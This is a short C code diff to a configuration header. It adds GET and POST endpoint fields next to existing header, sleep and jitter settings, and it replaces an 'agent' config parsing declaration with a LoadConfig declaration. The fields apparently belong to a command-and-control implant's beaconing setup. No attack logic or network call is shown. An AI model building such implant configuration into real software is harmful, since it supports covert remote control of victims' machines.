@@ -20,6 +20,8 @@ struct Config {
 
 	struct HeaderEntrys* headers;
 	size_t HeaderCount;
+	PBYTE GetEndpoint;
+	PBYTE PostEndpoint;
 
 	UINT Sleep;
 	UINT Jitter;
@@ -41,4 +43,4 @@ struct Config {
 
 
 
-//BOOL ParseAgentConfig();
+BOOL LoadConfig();
